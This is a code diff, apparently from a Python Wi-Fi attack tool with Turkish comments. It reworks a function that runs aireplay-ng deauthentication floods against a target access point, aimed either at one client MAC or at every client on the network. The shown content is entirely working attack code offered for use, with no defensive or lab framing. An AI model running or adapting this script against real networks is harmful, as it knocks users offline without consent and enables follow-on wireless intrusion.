@@ -62,26 +62,43 @@ def select_deauth_packet_count():
         return "5"
     return packet_count
 
+import subprocess
+
+import subprocess
+
 # Deauthentication saldırısını başlatma
 def start_deauth_attack(target_mac, client_mac, packet_count):
-    if not str(packet_count).isdigit():  # Sayısal olmayan girişleri kontrol et
+    # Paket sayısını doğrulama
+    if not str(packet_count).isdigit():  
         print("[-] Invalid packet count, defaulting to 10.")
-        packet_count = "10"  # Varsayılan olarak 10 paket gönder
+        packet_count = "10"
+    else:
+        packet_count = str(packet_count)  # Aireplay-ng string format bekliyor
     
     print(f"[*] Running attack with {packet_count} packets...")
 
+    # Wi-Fi arayüzünü belirleme
+    interface = "wlan0mon"
+
+    # Hedeflenen cihaza saldırı mı, yoksa SSID’ye genel saldırı mı?
     if client_mac:
         print(f"[*] Attacking {client_mac} in {target_mac} network...")
-        result = subprocess.run(["sudo", "aireplay-ng", "--deauth", packet_count, "-a", target_mac, "-c", client_mac, "-i", "wlan0mon", "--ignore-negative-one"], capture_output=True, text=True)
+        command = ["sudo", "aireplay-ng", "--deauth", packet_count, "-a", target_mac, "-c", client_mac, "-i", interface, "--ignore-negative-one"]
     else:
-        print(f"[*] Attacking entire {target_mac} network...")
-        result = subprocess.run(["sudo", "aireplay-ng", "--deauth", packet_count, "-a", target_mac, "-i", "wlan0mon", "--ignore-negative-one"], capture_output=True, text=True)
+        print(f"[*] Attacking entire {target_mac} network (SSID focus)...")
+        command = ["sudo", "aireplay-ng", "--deauth", packet_count, "-a", target_mac, "-i", interface, "--ignore-negative-one"]
 
-    print("[DEBUG] Command Output:", result.stdout)
-    print("[DEBUG] Command Error:", result.stderr)
+    # Saldırıyı başlat ve çıktıyı al
+    result = subprocess.run(command, capture_output=True, text=True)
 
-    if result.returncode != 0:
+    # Çıktı ve hata kontrolü
+    if result.returncode == 0:
+        print("[+] Attack successfully executed!")
+    else:
         print("[-] Error executing aireplay-ng! Check permissions or dependencies.")
+
+    print("[DEBUG] Command Output:", result.stdout)  # 🛠 Tam komut çıktısını gösteriyoruz!
+    print("[DEBUG] Command Error:", result.stderr)  # 🛠 Eğer hata varsa, bunun nedenini görebileceğiz!
 
 # Ana akış
 def main():
